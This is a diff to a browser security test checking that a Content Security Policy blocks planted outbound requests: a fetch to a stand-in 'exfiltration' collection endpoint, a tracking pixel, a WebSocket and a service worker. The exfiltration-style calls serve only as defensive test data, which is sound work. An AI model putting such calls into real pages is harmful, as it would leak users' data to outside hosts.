@@ -145,14 +145,15 @@ try {
       const outcome = {};
       try { await fetch('https://planted-exfiltration.invalid/collect'); outcome.fetch = 'sent'; } catch { outcome.fetch = 'blocked'; }
       new Image().src = 'https://planted-pixel.invalid/p.png';
-      try { new WebSocket('wss://planted-socket.invalid/'); outcome.socket = 'opened'; } catch { outcome.socket = 'blocked'; }
+      // CSP refuses the connection asynchronously; the constructor itself does not throw.
+      try { new WebSocket('wss://planted-socket.invalid/'); outcome.socket = 'constructed'; } catch { outcome.socket = 'blocked'; }
       try { await navigator.serviceWorker?.register('./sw.js'); outcome.sw = 'registered'; } catch { outcome.sw = 'blocked'; }
       await new Promise((r) => setTimeout(r, 400));
       return { ...outcome, csp: window.__cspViolations.map((v) => v.directive) };
     });
     assert.equal(planted.fetch, 'blocked');
     assert.notEqual(planted.sw, 'registered');
-    assert.ok(planted.csp.some((d) => d === 'connect-src') && planted.csp.some((d) => d === 'img-src'), `CSP reported the planted requests: ${planted.csp}`);
+    assert.ok(planted.csp.filter((d) => d === 'connect-src').length >= 2 && planted.csp.includes('img-src'), `CSP reported the planted fetch, socket and image: ${planted.csp}`);
     assert.deepEqual(seen.external, [], 'CSP stopped planted requests before the network');
     results.push({ plantedAttemptsRefusedByCsp: [...seen.attempts].map(([url, failure]) => ({ url, failure })) });
     await context.close();
